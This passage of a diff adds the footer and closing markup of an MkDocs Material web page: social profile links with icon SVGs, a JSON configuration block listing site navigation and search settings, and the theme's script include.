+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/tomfieber" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-188.5L26.8 48h145.6l100.5 132.9zm-24.8 373.8h39.1L151.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discordapp.com/users/4J6q3Y8708504340083507253" target="_blank" rel="noopener" title="discordapp.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485 485 0 0 0 404.081 32.03a1.82 1.82 0 0 0-1.923.91 338 338 0 0 0-14.9 30.6 447.9 447.9 0 0 0-134.426 0 310 310 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.7 483.7 0 0 0-119.688 37.107 1.7 1.7 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.02 2.02 0 0 0 .765 1.375 487.7 487.7 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348 348 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321 321 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251 251 0 0 0 9.109-7.137 1.82 1.82 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.81 1.81 0 0 1 1.924.233 235 235 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.4 301.4 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391 391 0 0 0 30.014 48.815 1.86 1.86 0 0 0 2.063.7A486 486 0 0 0 610.7 405.729a1.88 1.88 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs.sticky", "navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.footer", "navigation.top", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
